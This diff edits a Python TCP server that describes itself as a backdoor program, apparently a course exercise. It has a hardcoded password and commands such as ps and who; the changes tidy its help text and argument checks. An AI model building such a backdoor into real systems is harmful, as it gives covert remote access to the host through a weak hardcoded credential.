@@ -20,8 +20,8 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
        descriptions["help"] = 'help [cmd] - print a list of commands, and if given an argument, print more detailed help for the command'
        descriptions["logout"] = 'logout - disconnect client'
        descriptions["off"] = 'off - terminate the backdoor program'
-       descriptions["ps"] = 'show currently running processes'
-       descriptions["who"] = 'list user[s] currently logged in'
+       descriptions["ps"] = 'ps - show currently running processes'
+       descriptions["who"] = 'who - list user[s] currently logged in'
 
        password = "cpsc"
 
@@ -118,20 +118,20 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
                 # help [cmd]
                if data.split(None, 1)[0] == "help":
+                
                   if len(data.split()) == 1:
-
                       self.request.sendall(bytearray("supported commands:\n", "utf-8"))
                       for cmd in descriptions.keys():
                           self.request.sendall(bytearray(cmd + "\n", "utf-8"))
-                  elif len(data.split()) > 1:
+                  
+                  elif len(data.split()) == 2:
                       command = descriptions.get(data.split()[1])
                       self.request.sendall(bytearray(command + "\n", "utf-8"))
-
                   
-                  else:
-                    desc = descriptions.get(command)
-                    self.request.sendall(bytearray(desc + "\n", "utf-8"))
+                  else:                                                                         #accept exactly one command
+                    self.request.sendall(bytearray("bad request\n", "utf-8"))
                   continue
+
 
                 #ps                
                if data.strip() == "ps":
